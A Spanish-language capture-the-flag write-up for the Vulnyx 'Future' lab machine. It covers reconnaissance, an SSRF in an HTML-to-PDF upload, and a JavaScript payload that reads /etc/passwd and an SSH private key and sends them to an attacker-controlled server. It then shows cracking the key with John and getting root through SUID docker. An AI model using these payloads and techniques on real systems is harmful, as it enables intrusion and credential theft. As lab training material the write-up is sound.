# Vulnyx Future

### Escaneo de la red local

```bash
arp-scan -I eth0 --localnet
```

```
(IP-victima)  08:00:27:7f:36:3d  PCS Systemtechnik GmbH
```

### Escaneo de puertos

```bash
nmap -p 22,80 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
```

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: future.nyx
```

### Configuración de dominio local

```bash
nano /etc/hosts/
```

```
(IP victima)    future.nyx
```

### Encontrando archivos interesantes

Al ingresar al servidor, se observa una imagen de "Volver al futuro" y se deduce que Marty y el Doc pueden ser usuarios posibles.

Ejecutando un escaneo de directorios con `gobuster`:

```bash
gobuster dir -u (IP-victima) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.html
```

```
/assets
/1955.html
    "Welcome to 1955"
/2015.html
    "Welcome to 2015"
/transition
    Gif del Delorean a punto de viajar
/1885.html
    "Welcome to 1885"
/homework.html
    Gag de la película, donde Biff obliga a hacer su tarea de casa
    Permite subir archivos ".html" que serán convertidos a ".pdf"
```

### Vulnerabilidad SSRF

Podemos usar un archivo .html para realizar una comunicación entre un servidor propio y la máquina víctima generando un `<img>` con código malicioso.

```html
<img src="http://(IP atacante):443/prueba.html">
```

Escuchamos con `netcat` en el puerto 443 y subimos el archivo al servidor para generar tráfico entre nuestra máquina atacante y la máquina víctima.

```bash
nc -nlvp 443
```

```
connect to [192.168.200.5] from (UNKNOWN) [(IP-victima)] 54372
GET /prueba.html HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: (IP-atacante):443
```

Ahora podemos interactuar con la máquina víctima.

### Lectura de archivos

Usando un script `<script>` y el archivo .html enviado al servidor mientras escuchamos por el puerto 443, podemos obtener el archivo `/etc/passwd` en base64.

```html
<script>
    var readfile = new XMLHttpRequest(); // Leer archivo local
    var exfil = new XMLHttpRequest(); // Enviar el archivo a nuestro servidor
    readfile.open("GET","file:///etc/passwd", true);
    readfile.send();
    readfile.onload = function() {
        if (readfile.readyState === 4) {
            var url = 'http://<SERVICE IP>:<PORT>/?data=' + btoa(this.response);
            exfil.open("GET", url, true);
            exfil.send();
        }
    }
    readfile.onerror = function() { document.write('<a>Oops!</a>'); }
</script>
```
Fuente: [j4ckie0x17](https://j4ckie0x17.gitbook.io/notes-pentesting/pentesting-web/server-side-request-forgery-ssrf)

Guardamos el archivo en base64, luego lo decodificamos:

```bash
nano etcpasswd
```

**Pegamos el archivo recibido en base64**

```bash
base64 -d etcpasswd > etcpasswd-decodificado
```

```bash
cat etcpasswd-decodificado
```

Contenido importante:

```
root:x:0:0:root:/root:/bin/bash
marty.mcfly:x:1000:1000::/home/marty.mcfly:/bin/bash
emmett.brown:x:1001:1001::/home/emmett.brown:/bin/bash
```

Ya tenemos usuarios y una forma de leer archivos en el servidor. 

### Acceso al archivo id_rsa

```bash
////home/marty.mcfly/.ssh/id_rsa
```

Guardamos el contenido de id_rsa en base64:

```bash
nano idrsa64
```

Pegamos el contenido de id_rsa en base64 y lo decodificamos:

```bash
base64 -d idrsa64 > id_rsa
```

Ahora tenemos el id_rsa del usuario Marty McFly.

### Cracking id_rsa con John the Ripper

Convertimos id_rsa a un formato de hash que John the Ripper pueda usar:

```bash
ssh2john id_rsa > hash
```

Crackeamos el hash con la wordlist rockyou.txt:

```bash
john --wordlist=/usr/share/wodlists/rockyou.txt hash
```

Al no encontrar la contraseña, creamos diccionarios específicos:

```bash
cewl http://(ip-victima)/1955.html -w dic1.txt
cewl http://(ip-victima)/2015.html -w dic2.txt
cewl http://(ip-victima)/1885.html -w dic3.txt
```

Unimos los diccionarios en uno solo:

```bash
cat *.txt > dic.txt
```

Crackeamos el hash con el diccionario creado:

```bash
john --wordlist=dic.txt hash
```

Contraseña encontrada:

```
inadvertently (id_rsa)
```

Ahora podemos ingresar al servidor vía ssh.

```bash
chmod 600 id_rsa
ssh -i id_rsa marty.mcfly@192.168.200.29
```

Contraseña: `inadvertently`

Una vez dentro:

```bash
whoami
```

Salida:

```
marty.mcfly
```

### Escalamiento de privilegios

Buscamos archivos con permisos de suid:

```bash
find / -perm -4000 2>/dev/null
```

Salida:

```
/usr/bin/docker
```

Tenemos acceso a Docker como root. Podemos crear una nueva imagen con toda la información de la máquina víctima.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Fuente: [GTFObins: docker](https://gtfobins.github.io/gtfobins/docker/)

Al ejecutarlo, ya nos da una consola como root en una imagen creada con toda la información de la máquina víctima :D
